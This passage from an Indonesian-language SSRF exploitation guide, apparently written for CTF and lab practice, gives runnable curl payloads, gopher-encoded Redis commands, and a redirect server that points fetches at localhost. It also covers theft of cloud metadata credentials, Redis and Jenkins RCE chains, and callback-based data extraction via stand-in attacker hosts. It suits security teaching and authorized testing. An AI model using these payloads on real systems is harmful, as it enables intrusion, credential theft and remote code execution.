> - Contoh: Jika validator aplikasi memeriksa `if "attacker.com" in url:` atau menggunakan regex yang salah dalam mem-parse hostname, validator melihat `attacker.com` dan meloloskan URL tersebut. Namun saat HTTP client (seperti cURL atau library fetch backend) melakukan koneksi, bagian fragment diabaikan dan request tetap dikirim ke `127.0.0.1`.

---

## Port / Userinfo Confusion

Contoh:

```text
http://127.0.0.1:80@attacker.com/
```

Host sebenarnya:

```text
attacker.com
```

bukan localhost.

Ini berguna justru untuk memahami kenapa parser confusion dapat menipu validator.

---

## Case Variation

```text
HTTP://127.0.0.1/
```

Scheme case-insensitive pada banyak parsers.

Test:

```bash
curl -G \
--data-urlencode \
'url=HTTP://127.0.0.1/' \
http://TARGET/fetch
```

---

## Parser Mismatch Diagram

```text
Input
 │
 ▼
Validator
 │
 │ "Looks safe"
 ▼
URL Parser
 │
 │ "Actually localhost"
 ▼
HTTP Client
 │
 ▼
127.0.0.1
```

---

# 3.4 Protocol Bypass

## 📌 Kapan Digunakan

Saat SSRF filter hanya membatasi:

```text
http://
https://
```

tetapi fetcher/client mendukung protocol lain.

---

## `file://`

Contoh:

```text
file:///etc/hostname
```

Test:

```bash
curl -G \
--data-urlencode \
'url=file:///etc/hostname' \
http://TARGET/fetch
```

Potential:

```text
web01
```

---

## `dict://`

`dict://` dapat digunakan oleh beberapa clients untuk membuat network interaction.

Example:

```text
dict://127.0.0.1:6379/info
```

Namun client support sangat bergantung pada underlying HTTP library.

---

## `gopher://`

Format:

```text
gopher://HOST:PORT/_PAYLOAD
```

Contoh konseptual:

```text
gopher://127.0.0.1:6379/_PING%0d%0a
```

Ini akan menjadi relevan pada Redis.

---

## `ftp://`

```text
ftp://127.0.0.1/
```

Support tergantung client.

---

## `sftp://`

```text
sftp://127.0.0.1/
```

Membutuhkan support/library terkait.

---

## `tftp://`

```text
tftp://127.0.0.1/
```

Support bergantung implementation.

---

## `ldap://`

```text
ldap://127.0.0.1/
```

Again, backend client must support protocol tersebut.

---

## Protocol Decision

```text
SSRF
 │
 ▼
What protocols are allowed?
 │
 ├── HTTP only
 │      └── localhost/internal HTTP
 │
 ├── HTTP + file
 │      └── file disclosure
 │
 ├── gopher
 │      └── arbitrary TCP-style request construction
 │
 └── Other schemes
        └── protocol-specific pivot
```

---

# 3.5 Redirect Bypass

## 📌 Kapan Digunakan

Saat filter hanya memvalidasi URL awal:

```text
attacker.example
```

tetapi server mengikuti HTTP redirect.

---

## Flow

```text
Target
 │
 │ fetch attacker.example
 ▼
Attacker Server
 │
 │ 302 Location: http://127.0.0.1:8080/
 ▼
Target Server
 │
 ▼
127.0.0.1:8080
```

---

## Python Redirect Server

```python
from http.server import BaseHTTPRequestHandler, HTTPServer


class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header(
            "Location",
            "http://127.0.0.1:8080/"
        )
        self.end_headers()

    def log_message(self, fmt, *args):
        return


HTTPServer(
    ("0.0.0.0", 8000),
    RedirectHandler
).serve_forever()
```

Run:

```bash
python3 redirect.py
```

---

## Test

```bash
curl -G \
--data-urlencode \
'url=http://ATTACKER:8000/' \
http://TARGET/fetch
```

---

## Redirect Status Codes

|Code|Typical Meaning|
|---|---|
|`301`|permanent redirect|
|`302`|temporary redirect|
|`303`|see other|
|`307`|temporary redirect, method preserved|
|`308`|permanent redirect, method preserved|

Tidak semua HTTP clients mengikuti semua redirect.

---

# 3.6 DNS Rebinding — Konsep

## 📌 Kapan Digunakan

Saat validator:

```text
resolve once
validate IP
request later
```

dan DNS dapat berubah antara dua operasi.

---

## Flow

```text
          DNS query #1
Validator ───────────────→ attacker-domain
                              │
                              ▼
                         Public IP
                              │
                              ▼
                           "SAFE"


          DNS query #2
HTTP Client ─────────────→ attacker-domain
                              │
                              ▼
                       127.0.0.1/internal
                              │
                              ▼
                         "REQUEST"
```

---

## Kapan Berguna?

Ketika aplikasi:

```text
1. resolve hostname
2. validate resolved address
3. later performs request
```

dan tidak mengikat destination yang sudah divalidasi.

Modern resolvers/proxies/application behavior dapat membuat serangan ini lebih kompleks.

---

# 🚀 4. SSRF Advanced Techniques

# 4.1 Gopher Protocol untuk SSRF

## 📌 Kapan Digunakan

Saat:

```text
HTTP SSRF terbukti
+
fetcher mendukung gopher
+
internal service bukan HTTP
```

Gopher dapat digunakan untuk membuat byte/request sequence menuju TCP service tertentu.

---

## Format

```text
gopher://HOST:PORT/_ENCODED_DATA
```

Contoh:

```text
gopher://127.0.0.1:6379/_PING%0d%0a
```

Breakdown:

```text
gopher://
    │
    ├── scheme
    │
    ▼
127.0.0.1
    │
    ▼
:6379
    │
    ▼
/_
    │
    ▼
PAYLOAD
```

---

## Kenapa CRLF Encoding Wajib di Gopher?

Protokol berbasis teks di atas TCP (seperti **Redis RESP**, **SMTP**, **FastCGI**, dan **HTTP**) mengandalkan delimiter baris **CRLF** (`\r\n`) untuk memisahkan setiap instruksi perintah.

Ketika menyusun URL Gopher (`gopher://HOST:PORT/_...`), karakter byte kontrol harus di-encode:

| Karakter | Arti | URL Encoded Byte |
|---|---|---|
| `\r` | Carriage Return | `%0D` |
| `\n` | Line Feed | `%0A` |
| ` ` | Space (Spasi) | `%20` |

### Kenapa `%0D%0A` Sangat Penting di Redis?
Server Redis mem-parse perintah berdasarkan baris yang diakhiri oleh `%0D%0A` (`\r\n`). Jika delimiter ini hilang atau tidak di-encode dengan benar, Redis akan menganggap seluruh teks sebagai satu perintah tidak valid atau mengabaikannya.

### Contoh Konkret Manual Encoding:
1. **Perintah Sederhana (`PING`):**
   - Raw: `PING\r\n`
   - Gopher Encoded: `PING%0D%0A`
   - URL Gopher: `gopher://127.0.0.1:6379/_PING%0D%0A`

2. **Perintah Berargumen (`SET key value`):**
   - Raw: `SET flag CTF{ssrf_success}\r\n`
   - Gopher Encoded: `SET%20flag%20CTF%7Bssrf_success%7D%0D%0A`
   - URL Gopher: `gopher://127.0.0.1:6379/_SET%20flag%20CTF%7Bssrf_success%7D%0D%0A`

3. **Multi-Command Batching:**
   ```text
   AUTH secretpass\r\n
   SET test 123\r\n
   QUIT\r\n
   ```
   Menjadi:
   `_AUTH%20secretpass%0D%0ASET%20test%20123%0D%0AQUIT%0D%0A`

> ⚠️ **Catatan Double URL-Encoding:**
> Jika payload gopher dikirimkan sebagai nilai parameter pada HTTP GET request (misal `?url=gopher://...`), karakter `%` harus di-encode ulang menjadi `%25` (sehingga `%0D%0A` menjadi `%250D%250A`) agar tidak ter-decode prematur oleh web server sebelum mencapai fetcher backend!

---

## HTTP Request via Gopher

Concept:

```text
POST / HTTP/1.1
Host: 127.0.0.1
Content-Length: 4

test
```

menjadi encoded byte/string dalam gopher URL.

---

## Why Gopher Is Powerful

```text
HTTP fetcher
     │
     ▼
gopher://
     │
     ▼
TCP service
     │
 ┌───┼─────────┐
 ▼   ▼         ▼
Redis SMTP    HTTP
```

---

## Generator

Gunakan tool generator seperti:

```text
Gopherus
```

untuk mengurangi kesalahan URL encoding.

---

# 4.2 SSRF ke Redis via Gopher

## 📌 Kapan Digunakan

Dalam lab ketika:

```text
SSRF → gopher → Redis
```

dan Redis tidak membutuhkan authentication.

---

## Redis via Gopher — Simple Command

Redis protocol:

```text
PING
```

RESP encoding:

```text
*1
$4
PING
```

URL-encoded concept:

```text
gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A
```

---

## SSRF Test

```bash
curl -G \
--data-urlencode \
'url=gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A' \
http://TARGET/fetch
```

Expected Redis response:

```text
+PONG
```

---

## Redis RCE Chain — Lab Overview

Classic chain:

```text
SSRF
 │
 ▼
Gopher
 │
 ▼
Redis
 │
 ▼
Write attacker-controlled file
 │
 ▼
Executable/authorized location
 │
 ▼
Application/SSH trigger
 │
 ▼
Potential RCE
```

---

## SSH Key Write Concept

Pada **lab yang memang menggunakan Redis tanpa auth dan memiliki writable filesystem**, salah satu historical technique adalah menyalahgunakan Redis persistence untuk menulis ke:

```text
~/.ssh/authorized_keys
```

High-level prerequisites:

```text
Redis unauthenticated
+
write access
+
known writable user home
+
SSH enabled
+
filesystem permissions
```

Flow:

```text
Gopher
  │
  ▼
Redis CONFIG SET
  │
  ▼
Persistence directory
  │
  ▼
Persistence filename
  │
  ▼
Authorized key file
  │
  ▼
SSH login
```

**Jangan menganggap path Redis persistence dapat langsung diubah di semua deployment.** Modern Redis deployments, ACLs, protected mode, filesystem permissions, containers, dan SSH configuration sering mematahkan chain ini.

---

## Safer CTF Validation

Pertama buktikan:

```text
Redis reachable
```

Kedua:

```text
PING
```

Ketiga:

```text
INFO
```

Baru lanjut ke challenge-specific primitive.

---

# 4.3 SSRF ke Internal API

## 📌 Kapan Digunakan

Saat internal service mempunyai REST API:

```text
127.0.0.1:8080
127.0.0.1:8000
internal-api:5000
```

---

## GET

```bash
curl -G \
--data-urlencode \
'url=http://127.0.0.1:8080/api/users' \
http://TARGET/fetch
```

---

## JSON API

SSRF URL:

```text
http://127.0.0.1:8080/api/admin
```

Jika fetcher hanya melakukan GET, Anda tidak dapat otomatis mengubahnya menjadi POST.

Cari primitive yang mendukung:

```text
method
headers
body
```

---

## Authentication Header Forwarding

Aplikasi yang flawed mungkin melakukan:

```text
Client
  │
  │ Authorization: Bearer TOKEN
  ▼
SSRF Endpoint
  │
  ▼
Internal API
```

Jika internal API percaya header yang diteruskan:

```text
SSRF + forwarded credentials
```

dapat memperluas impact.

---

## JSON Body

Jika endpoint SSRF mendukung POST forwarding:

```http
POST /fetch HTTP/1.1
Content-Type: application/json

{
  "url": "http://127.0.0.1:8080/api/admin",
  "method": "POST",
  "body": "{\"action\":\"test\"}"
}
```

Tidak semua SSRF primitive mendukung pola ini.

---

# 4.4 Blind SSRF

## 📌 Kapan Digunakan

Saat:

```text
Server melakukan request
BUT
response tidak dikembalikan ke attacker.
```

Flow:

```text
Attacker
  │
  ▼
SSRF endpoint
  │
  ▼
Target server
  │
  ▼
Attacker listener
```

---

## DNS Callback

Gunakan callback domain:

```text
UNIQUE-ID.callback.example
```

Request:

```bash
curl -G \
--data-urlencode \
'url=http://UNIQUE-ID.callback.example/' \
http://TARGET/fetch
```

Callback:

```text
DNS request from TARGET
```

Bukti:

```text
server-side resolution occurred
```

---

## HTTP Callback

```text
http://UNIQUE-ID.callback.example/test
```

Jika HTTP request diterima:

```text
SSRF confirmed
```

---

## interactsh

Generate URL:

```bash
interactsh-client
```

Output:

```text
[INF] Listing 1 payload for OOB testing
xxxxxxxx.oast.fun
```

Gunakan:

```bash
curl -G \
--data-urlencode \
'url=http://xxxxxxxx.oast.fun/' \
http://TARGET/fetch
```

Callback:

```text
[HTTP] x.x.x.x:xxxxx
```

---

## Burp Collaborator

Flow:

```text
Burp Collaborator
      │
      ▼
Unique callback domain
      │
      ▼
SSRF endpoint
      │
      ▼
Target server
      │
      ▼
Collaborator interaction
```

---

## Data Extraction dari Blind SSRF

Blind SSRF biasanya tidak memberikan arbitrary response body.

Cari side channels:

```text
DNS
HTTP path
query parameter
subdomain
timing
```

Contoh concept:

```text
http://SECRET_VALUE.callback.example/
```

Tetapi kemampuan membuat destination bergantung pada parser/application.

---

# 4.5 Semi-Blind SSRF

## 📌 Kapan Digunakan

Saat tidak mendapat body, tetapi response metadata berbeda.

---

## Response Time

```text
Public URL:
0.15s

Internal closed:
0.04s

Internal service:
0.20s

Filtered:
5.00s timeout
```

---

## Content-Length

```bash
curl -sS -o /dev/null \
-w 'code=%{http_code} size=%{size_download}\n' \
...
```

Compare:

```text
/public → 1256
/internal → 4312
```

---

## Error Differences

```text
Connection refused
Host unreachable
DNS resolution failed
HTTP 403
HTTP 401
HTTP 200
```

Error text dapat menjadi side-channel.

---

# 📦 5. SSRF di Berbagai Konteks

# 5.1 SSRF via PDF Generator

## 📌 Kapan Digunakan

Saat aplikasi:

```text
URL → server fetch → HTML → PDF
```

atau:

```text
HTML → headless browser → PDF
```

---

## Common Endpoints

```text
/generate-pdf
/export
/render
/pdf
/print
/report
```

---

## HTML Resource Test

HTML:

```html
<html>
<body>
<h1>SSRF TEST</h1>
<img src="http://ATTACKER:8000/test">
</body>
</html>
```

Jika PDF generator memuat remote resources:

```text
PDF rendering
      │
      ▼
<img src=ATTACKER>
      │
      ▼
HTTP callback
```

---

## Internal URL

Parameter:

```text
url=http://127.0.0.1:8080/
```

Jika PDF berisi:

```text
Internal Admin Dashboard
```

SSRF confirmed through browser/rendering backend.

---

# 5.2 SSRF via Image Fetcher

## 📌 Kapan Digunakan

Saat avatar/profile image diberikan sebagai URL.

Contoh:

```text
POST /avatar

image_url=https://example.com/a.jpg
```

---

## Detection

Gunakan server:

```bash
python3 -m http.server 8000
```

Then:

```bash
curl -X POST \
http://TARGET/profile \
-d 'image_url=http://ATTACKER:8000/test.jpg'
```

Expected:

```text
GET /test.jpg
```

---

## Internal Test

```text
image_url=http://127.0.0.1:8080/
```

Jika response/processed image menunjukkan internal content:

```text
SSRF candidate
```

---

# 5.3 SSRF via Webhook

## 📌 Kapan Digunakan

Saat aplikasi meminta:

```text
Webhook URL
Callback URL
Notification URL
```

---

## Callback Test

Run:

```bash
python3 -m http.server 8000
```

Submit:

```text
http://ATTACKER:8000/webhook
```

Expected:

```text
GET /webhook
```

---

## Internal Pivot

```text
webhook=http://127.0.0.1:8080/admin
```

Jika internal service accessible:

```text
SSRF → internal API
```

---

# 5.4 SSRF via URL Preview / Link Unfurling

## 📌 Kapan Digunakan

Pada feature:

```text
Paste URL
Generate Preview
Fetch title
Fetch thumbnail
```

---

## Test

```text
http://ATTACKER:8000/
```

Observe:

```text
GET /
```

Then:

```text
http://127.0.0.1:8080/
```

---

## Expected

Public:

```text
Example Domain
```

Internal:

```text
Admin Panel
```

---

# 5.5 SSRF via File Import

## 📌 Kapan Digunakan

Fitur:

```text
Import CSV from URL
Import XML from URL
Import feed
Remote document
```

---

## Test

```bash
curl -X POST \
http://TARGET/import \
--data-urlencode \
'url=http://ATTACKER:8000/data.csv'
```

Receiver:

```text
GET /data.csv
```

---

## XXE Chain

```text
Import XML URL
      │
      ▼
Server fetches XML
      │
      ▼
XML parser
      │
      ▼
XXE
```

Jadi:

```text
SSRF → XML import → XXE
```

dapat menjadi chain.

---

# 5.6 SSRF via Header Injection

## 📌 Kapan Digunakan

Ketika server menyusun downstream request berdasarkan incoming headers.

Contoh:

```text
Host
X-Forwarded-Host
X-Original-URL
Referer
```

---

## Host

```bash
curl -i \
-H 'Host: internal.example' \
http://TARGET/
```

Ini sendiri **bukan otomatis SSRF**.

Yang dicari:

```text
Host header
   │
   ▼
Server builds downstream URL
   │
   ▼
Internal target
```

---

## X-Forwarded-Host

```bash
curl -i \
-H 'X-Forwarded-Host: 127.0.0.1:8080' \
http://TARGET/
```

Relevant hanya apabila proxy/application mempercayai header tersebut.

---

# 💥 6. SSRF to RCE

# 6.1 SSRF → Redis → RCE

## 📌 Kapan Digunakan

Saat semua berikut terpenuhi:

```text
SSRF
+
gopher support
+
Redis reachable
+
Redis authentication absent/known
+
write/persistence primitive
+
target filesystem writable
+
execution trigger exists
```

---

## Flow

```text
SSRF
 │
 ▼
gopher://127.0.0.1:6379
 │
 ▼
Redis
 │
 ▼
Write controlled data
 │
 ▼
Filesystem
 │
 ▼
Execution trigger
 │
 ▼
RCE
```

---

## Step 1

Prove Redis:

```text
gopher://127.0.0.1:6379/_PING...
```

Expected:

```text
+PONG
```

---

## Step 2

Query Redis:

```text
INFO
```

Gunakan Gopherus untuk membuat protocol payload lebih reliable.

---

## Step 3

Cari writable/executable primitive.

Checklist:

```text
[ ] Redis no auth (atau requirepass diketahui)
[ ] CONFIG available
[ ] persistence available
[ ] target path known
[ ] SSH/web server execution trigger exists
```

---

## Prasyarat & Proteksi Redis Modern (ACL & requirepass)

Sebelum mengeksploitasi Redis menuju RCE, perhatikan konfigurasi autentikasi dan versi:

1. **Redis dengan Password (`requirepass`):**
   Jika server Redis dikonfigurasi dengan password:
   - Gopher payload **WAJIB** menyertakan perintah `AUTH <password>` sebagai baris instruksi pertama:
     ```text
     AUTH password123\r\n
     CONFIG SET dir /var/www/html\r\n
     ...
     ```
   - Jika perintah `AUTH` tidak disertakan, Redis akan membalas dengan `(error) NOAUTH Authentication required.` dan membatalkan seluruh eksekusi perintah berikutnya.

2. **Redis Versi 7+ (Sistem ACL & Protected Mode):**
   - Redis versi 7 ke atas memiliki sistem Access Control List (ACL) yang jauh lebih ketat. Pengguna non-default atau default tanpa privilege penuh tidak diizinkan menjalankan perintah berbahaya seperti `CONFIG` atau `MODULE LOAD`.
   - Mode `protected-mode yes` (default) menolak koneksi eksternal jika tanpa password, meskipun via SSRF loopback (`127.0.0.1`) biasanya masih diizinkan.

---

## Step 4

Challenge-specific RCE chain.

Tidak semua Redis deployment mendukung classic `authorized_keys` chain.

---

# 6.2 SSRF → Internal Admin → RCE

## 📌 Kapan Digunakan

Saat internal service tidak exposed externally tetapi SSRF dapat membukanya.

Flow:

```text
SSRF
 │
 ▼
127.0.0.1:8080
 │
 ▼
Admin Panel
 │
 ▼
Authenticated / unauthenticated functionality
 │
 ▼
Command execution primitive
 │
 ▼
RCE
```

---

## Common Internal Admin Targets

```text
Jenkins
Tomcat Manager
GitLab internal
Grafana
Kibana
Spring Boot Actuator
Custom admin panel
Docker API
Kubernetes API
```

---

## Example

```bash
curl -G \
--data-urlencode \
'url=http://127.0.0.1:8080/' \
http://TARGET/fetch
```

Discover:

```text
Jenkins login
```

Then inspect:

```text
/plugins
/login
/manage
/script
```

Jenkins RCE requires authentication/appropriate permission in many modern configurations.

---

# 6.3 SSRF → Cloud Metadata → RCE

## 📌 Kapan Digunakan

Saat:

```text
SSRF
→ metadata
→ temporary cloud credentials
```

---

## Flow

```text
SSRF
 │
 ▼
Metadata
 │
 ▼
Temporary Credentials
 │
 ▼
aws sts get-caller-identity
 │
 ▼
IAM Permissions
 │
 ▼
Cloud Resource
 │
 ▼
Potential command execution
```

---

## AWS

Retrieve credentials:

```text
/latest/meta-data/iam/security-credentials/
```

Save locally:

```text
~/.aws/credentials
```

Verify:

```bash
aws sts get-caller-identity
```

Then:

```text
What does this identity control?
```

Potential resource classes:

```text
EC2
Lambda
ECS
SSM
CloudFormation
IAM
Secrets
```

RCE is only possible where permissions and service functionality allow it.

---

# 6.4 SSRF → Internal CI/CD → RCE

## 📌 Kapan Digunakan

Saat SSRF membuka internal CI/CD system.

---

## Jenkins

Discover:

```text
http://127.0.0.1:8080/
```

Then:

```text
Jenkins
 │
 ├── Login
 ├── API
 ├── Jobs
 └── Script Console
```

---

## Script Console

Pada Jenkins instance/lab dengan permission yang tepat, Groovy Script Console dapat menjalankan code server-side.

Contoh benign verification:

```groovy
println "SSRF_CHAIN_TEST"
```

Expected:

```text
SSRF_CHAIN_TEST
```

RCE impact memerlukan:

```text
Jenkins access
+
script execution permission
```

---

# 🧰 7. Tools & Automation

# 7.1 Interactsh untuk SSRF Detection

## 📌 Kapan Digunakan

Tool utama untuk:

```text
Blind SSRF
DNS callback
HTTP callback
```

---

## Install

Metode Go:

```bash
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```

Path:

```bash
export PATH="$PATH:$(go env GOPATH)/bin"
```

Verify:

```bash
interactsh-client -version
```

---

## Start

```bash
interactsh-client
```

Output:

```text
[INF] Listing 1 payload for OOB testing
abc123.oast.fun
```

Gunakan:

```bash
curl -G \
--data-urlencode \
'url=http://abc123.oast.fun/' \
http://TARGET/fetch
```

Callback:

```text
[INF] HTTP interaction
[INF] DNS interaction
```

---

# 7.2 SSRFmap

## 📌 Kapan Digunakan

Untuk mengotomasi SSRF testing setelah manual candidate ditemukan.

Clone:

```bash
git clone https://github.com/swisskyrepo/SSRFmap.git
cd SSRFmap
```

Install:

```bash
python3 -m pip install -r requirements.txt
```

Help:

```bash
python3 ssrfmap.py --help
```

Untuk request complex:

```text
Burp request
     │
     ▼
Save request
     │
     ▼
SSRFmap
```

Syntax dapat berbeda antar versi; gunakan:

```bash
python3 ssrfmap.py --help
```

sebelum menjalankan module.

---

# 7.3 Gopherus

## 📌 Kapan Digunakan

Saat perlu membuat gopher payload untuk service tertentu.

Clone:

```bash
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus
```

Run:

```bash
python3 gopherus.py
```

Help:

```bash
python3 gopherus.py --help
```

Tool membantu membuat payload untuk protocol tertentu seperti:

```text
Redis
MySQL
FastCGI
SMTP
Memcached
```

Dukungan protocol tergantung versi tool.

---

# 7.4 Script `ssrf_test.sh`

## 📌 Kapan Digunakan

Untuk screening awal:

```text
localhost
localhost representations
AWS
GCP
Azure
```

Script mengasumsikan:

```text
GET /fetch?url=...
```

```bash
#!/usr/bin/env bash

set -u

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

usage() {
    echo "Usage: $0 <target_url> <parameter>"
    echo
    echo "Example:"
    echo "$0 'http://TARGET/fetch' url"
    exit 1
}

[[ $# -eq 2 ]] || usage

TARGET="$1"
PARAM="$2"

if [[ ! "$TARGET" =~ ^https?:// ]]; then
    echo -e "${RED}[!] Target must start with http:// or https://${NC}"
    exit 1
fi

if [[ "$TARGET" =~ [[:space:]] ]]; then
    echo -e "${RED}[!] Target contains whitespace${NC}"
    exit 1
fi

if [[ ! "$PARAM" =~ ^[A-Za-z0-9_-]+$ ]]; then
    echo -e "${RED}[!] Invalid parameter name${NC}"
    exit 1
fi

if ! command -v curl >/dev/null 2>&1; then
    echo -e "${RED}[!] curl is required${NC}"
    exit 1
fi

test_url() {
    local label="$1"
    local destination="$2"

    echo
    echo -e "${YELLOW}[*] $label${NC}"
    echo "    URL: $destination"

    RESPONSE="$(
        curl -ksS \
        --max-time 8 \
        -w '\n__STATUS__=%{http_code}\n__SIZE__=%{size_download}\n__TIME__=%{time_total}\n' \
        --get \
        --data-urlencode "${PARAM}=${destination}" \
        "$TARGET" \
        2>&1 || true
    )"

    echo "$RESPONSE" | tail -6
}

echo -e "${BLUE}=== SSRF QUICK TEST ===${NC}"
echo "Target : $TARGET"
echo "Param  : $PARAM"

test_url \
    "External baseline" \
    "https://example.com/"

test_url \
    "Localhost" \
    "http://127.0.0.1/"

test_url \
    "Localhost hostname" \
    "http://localhost/"

test_url \
    "IPv6 loopback" \
    "http://[::1]/"

test_url \
    "Decimal loopback" \
    "http://2130706433/"

test_url \
    "Hex loopback" \
    "http://0x7f000001/"

test_url \
    "AWS metadata" \
    "http://169.254.169.254/latest/meta-data/"

# Catatan: GCP metadata membutuhkan header 'Metadata-Flavor: Google'
test_url \
    "GCP metadata (Needs Metadata-Flavor: Google)" \
    "http://metadata.google.internal/"

test_url \
    "Azure metadata" \
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

echo
echo -e "${YELLOW}=== NEXT STEPS ===${NC}"
echo "1. Compare status/body size/timing with the external baseline."
echo "2. Confirm interesting localhost destinations manually."
echo "3. Note: GCP metadata test membutuhkan header 'Metadata-Flavor: Google' yang tidak bisa dikirim via simple URL parameter. Lakukan manual test jika SSRF mendukung custom header / CRLF injection."
echo "4. Test redirect behavior & alternate URL representations."
echo "5. Use interactsh for Blind SSRF."
```

Run:

```bash
chmod +x ssrf_test.sh

./ssrf_test.sh \
'http://TARGET/fetch' \
url
```

Contoh output:

```text
=== SSRF QUICK TEST ===
Target : http://10.10.10.10/fetch
Param  : url

[*] External baseline
    URL: https://example.com/
__STATUS__=200
__SIZE__=1256
__TIME__=0.324

[*] Localhost
    URL: http://127.0.0.1/
__STATUS__=403
__SIZE__=87
__TIME__=0.041

[*] AWS metadata
    URL: http://169.254.169.254/latest/meta-data/
__STATUS__=200
__SIZE__=141
__TIME__=0.039
```

Interpretasi:

```text
AWS metadata
     │
     ▼
HTTP 200
     │
     ▼
Strong SSRF candidate
```

Tetap verify response body.

---

# 7.5 Script `ssrf_port_scan.sh`

## 📌 Kapan Digunakan

Sudah tersedia di [1.3 SSRF Internal Port Scanning](#13-ssrf-internal-port-scanning).

Usage:

```bash
./ssrf_port_scan.sh \
'http://TARGET/fetch' \
url \
8000 \
9000
```

---

# 🌳 8. Decision Tree

## Standalone SSRF Decision Tree

```text
PARAMETER MENERIMA URL
          │
          ▼
Test dengan attacker URL
          │
          ▼
Server melakukan fetch?
          │
     ┌────┴─────┐
    YES         NO
     │           │
     ▼           ▼
  SSRF       Not SSRF / Wrong
  Candidate    assumption
     │
     ▼
Response body terlihat?
     │
 ┌───┴──────────┐
YES              NO
 │                │
 ▼                ▼
FULL SSRF       Blind SSRF
 │                │
 ▼                ├── DNS callback
Test localhost    ├── HTTP callback
 │                └── timing
 ├── 127.0.0.1
 ├── localhost
 ├── ::1
 └── alternate representations
 │
 ▼
Internal service?
 │
 ├── 80/443
 ├── 8080
 ├── 8443
 ├── 9200
 ├── 6379
 ├── 2375
 ├── 8001
 └── 10250
 │
 ▼
Cloud environment?
 │
 ├── AWS
 │    └── IMDS
 │         ├── v1 GET
 │         └── v2 token + GET
 │
 ├── GCP
 │    └── Metadata-Flavor: Google
 │
 └── Azure
      └── Metadata: true
 │
 ▼
Filter / allowlist?
 │
 ├── YES
 │    ├── IP representation
 │    ├── hostname
 │    ├── parser confusion
 │    ├── redirect
 │    ├── DNS rebinding
 │    └── protocol
 │
 └── NO
      │
      ▼
Advanced protocol?
      │
      ├── gopher
      ├── file
      ├── dict
      └── protocol-specific
      │
      ▼
Internal chain?
      │
      ├── Redis
      ├── Docker
      ├── Jenkins
      ├── Kubernetes
      └── Cloud credentials
      │
      ▼
Impact
```

---

## Blind SSRF Branch

```text
URL parameter
     │
     ▼
Attacker callback domain
     │
     ▼
No visible response
     │
     ▼
interactsh / Collaborator
     │
     ├── DNS hit
     │      └── DNS-level SSRF
     │
     └── HTTP hit
            └── HTTP SSRF
```

---

## Localhost Branch

```text
SSRF confirmed
     │
     ▼
127.0.0.1
     │
     ├── 80/443 → web service
     ├── 8080 → admin/Jenkins
     ├── 9200 → Elasticsearch
     ├── 6379 → Redis
     ├── 2375 → Docker
     ├── 8001 → Kubernetes API
     └── 10250 → kubelet
```

---

## Cloud Metadata Branch

```text
SSRF
 │
 ▼
169.254.169.254
 │
 ├── AWS
 │    ├── /latest/meta-data/
 │    ├── IAM credentials
 │    └── user-data
 │
 ├── Azure
 │    ├── /metadata/instance
 │    └── identity/oauth2/token
 │
 └── GCP
      ├── metadata.google.internal
      ├── project info
      └── service account token
```

---

# 🛠️ 9. Common Errors & Troubleshooting

|Error|Sebab|Solusi|
|---|---|---|
|Semua port terlihat `502`|SSRF proxy mengubah semua connection errors menjadi 502|Gunakan body/error content dan baseline|
|Semua port terlihat `200`|Application selalu mengembalikan generic 200|Bandingkan size/body/timing|
|Semua port timeout|Internal network unreachable atau proxy timeout|Test known-open port terlebih dahulu|
|Cloud metadata tidak accessible|Host bukan cloud instance|Konfirmasi environment|
|AWS metadata `401`/forbidden|IMDS policy/version restriction|Tentukan IMDSv1 vs IMDSv2|
|IMDSv2 requirement|Metadata token diperlukan|SSRF primitive harus mendukung PUT + header|
|GCP metadata ditolak|`Metadata-Flavor` hilang|Gunakan primitive yang mendukung custom header|
|Azure metadata ditolak|`Metadata: true` hilang|Tambahkan header jika SSRF primitive mendukung|
|Redirect tidak diikuti|HTTP client tidak follow redirect|Cek fetcher behavior|
|Redirect diikuti tetapi tetap external|Validator re-checks destination|Filter validates every redirect hop|
|`localhost` diblok|String/IP allowlist|Identifikasi parser/normalization difference|
|Decimal IP tidak bekerja|URL parser tidak menerima integer IP|Coba hanya representations yang didukung parser target|
|`::1` tidak bekerja|IPv6 disabled|Gunakan IPv4 loopback|
|`nip.io` tidak resolve|DNS/network restriction|Gunakan domain sendiri yang terkontrol|
|DNS rebinding gagal|Resolver caching atau validation setiap request|Re-test timing/TTL dan application architecture|
|`file://` tidak bekerja|Fetcher hanya HTTP(S)|Cari alternate protocol support|
|`gopher://` tidak bekerja|Client tidak mendukung gopher|Cek underlying library/protocol allowlist|
|Redis tidak merespons HTTP|Redis bukan HTTP|Gunakan gopher bila supported|
|Docker `2375` tidak accessible|Docker daemon protected/HTTPS|Check actual endpoint|
|Jenkins tidak ada di 8080|Service menggunakan port berbeda|Scan known internal ports|
|Elasticsearch tidak accessible|Binding hanya localhost/cluster auth|Test correct host/port and auth|
|Blind SSRF tidak callback|Target tidak dapat reach listener|Verify routing, DNS, firewall, callback URL|
|DNS callback ada tetapi HTTP tidak|Only DNS resolution occurs|Itu tetap membuktikan server-side DNS interaction, bukan full HTTP SSRF|
|Callback source IP berbeda|Proxy/NAT/container network|Jangan menganggap source IP = application host|
|Response body tidak muncul|Blind/semi-blind SSRF|Gunakan timing, size, errors, OOB|
|SSRF endpoint only accepts GET|Tidak ada method/header control|Pilih target yang dapat diakses dengan simple GET|
|Internal service returns 403|Service reachable tetapi protected|403 tetap bukti reachability|
|Internal service returns 401|Authentication required|Service reachable dan auth diperlukan|
|Port scan lambat|SSRF endpoint timeout terlalu lama|Perkecil range dan timeout|
|False positive timing|Network jitter|Gunakan baseline berulang|
|File parser only fetches images|URL scheme/resource type restricted|Uji callback sebagai valid resource type|
|PDF generator tidak melakukan callback|Remote resources disabled|Inspect rendering configuration|
|Webhook callback hanya terjadi setelah event|Request asynchronous|Trigger event yang benar lalu monitor listener|
|Host header tidak mengubah destination|Application tidak mempercayai header|Cari sink server-side yang benar|
|SSRF ke metadata tetapi hanya blank body|Response filtering|Gunakan output channel/OOB atau metadata headers|
|AWS credential tidak bisa dipakai|Credential expired|Check `Expiration`|
|AWS `AccessDenied`|IAM privilege terbatas|Enumerate identity/allowed actions|
